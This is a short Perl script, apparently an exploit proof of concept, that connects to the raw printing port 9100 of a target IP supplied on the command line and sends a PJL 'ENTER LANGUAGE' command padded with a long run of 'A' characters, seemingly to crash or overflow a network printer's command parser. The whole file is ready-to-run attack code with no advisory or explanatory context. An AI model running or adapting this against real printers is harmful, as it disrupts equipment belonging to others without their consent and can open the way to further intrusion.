#!/usr/bin/perl -w


use IO::Socket;
if (@ARGV < 1){
exit
}
$ip = $ARGV[0];
#open the socket
my $sock = new IO::Socket::INET (
PeerAddr => $ip,
PeerPort => '9100',
Proto => 'tcp',
);


$sock or die "no socket :$!";
send($sock, "\033%-12345X\@PJL ENTER LANGUAGE = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",0);



close $sock;